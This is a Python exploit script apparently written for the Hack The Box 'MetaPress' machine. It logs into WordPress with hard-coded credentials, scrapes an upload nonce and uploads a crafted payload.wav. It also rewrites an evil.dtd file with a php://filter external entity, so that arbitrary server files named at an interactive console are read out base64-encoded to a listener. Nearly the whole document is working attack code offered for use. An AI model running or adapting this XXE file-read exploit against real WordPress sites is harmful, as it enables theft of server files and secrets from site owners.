#!/usr/bin/python3

import requests
import re,time
import threading
from listener import server

class controller():
    def __init__(self):
        self.wp_login = "http://metapress.htb/wp-login.php"
        self.wp_media = "http://metapress.htb/wp-admin/media-new.php"
        self.wp_upload = "http://metapress.htb/wp-admin/async-upload.php"
        
        self.login_form = {
        "log": "manager","pwd": "partylikearockstar","wp-submit": "Log+In",
        "redirect_to": "http://metapress.htb/wp-admin/","testcookie": "1"
        }
        #request for login
        res = requests.post(url=self.wp_login,data=self.login_form)
        self.cookie = res.cookies

    def fileWrite(self,fileName):
        changeline = f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={fileName}">\n'
        file = open('evil.dtd','r')
        lines = file.readlines()
        lines[0] = changeline
        with open('evil.dtd','w') as out:
            out.writelines(lines)
        self.wp_nonce()


    def wp_nonce(self):
        #request for wp_nonce
        res = requests.get(url=self.wp_media,cookies=self.cookie)
        wp_nonces = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)
        self.mediaUpload(wp_nonces[0])


    def mediaUpload(self,wp_nonce,Timeout=2):
        #request for upload our payload file
        data = {"name":"payload.wav","post_id":"0","_wpnonce":wp_nonce,"type":"","tab":"","short":"1"}
        file = {"async-upload":open('payload.wav','rb')}
        try:
            res = requests.post(url=self.wp_upload,data=data,files=file,cookies=self.cookie,timeout=Timeout)
        except:
            None

thread = threading.Thread(target=server,args=(''))
thread.daemon=True
thread.start()

Control = controller()

try:
    while True:
        prompt = "console > "
        time.sleep(1)
        cmd = input(prompt)
        Control.fileWrite(cmd)

except KeyboardInterrupt:
    print('')